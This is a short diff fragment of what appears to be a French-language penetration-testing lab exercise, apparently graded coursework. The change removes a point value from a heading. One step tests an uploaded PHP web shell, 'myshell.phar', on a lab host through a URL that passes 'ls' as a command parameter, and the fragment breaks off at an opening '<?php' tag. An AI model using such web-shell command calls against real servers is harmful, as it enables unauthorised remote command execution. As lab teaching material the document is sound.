@@ -172,7 +172,7 @@ cd /usr/games
 ./cowsay hello df
 ```
 
-## Exécution d’un script `myshell.phar` sur `pentester-03` [3 pts]**
+## Exécution d’un script `myshell.phar` sur `pentester-03`
     1. Tester depuis le navigateur de l’étudiant *`http://pentester-03/admin/uploads/myshell.phar?cmd=ls`*
         
         <?php  
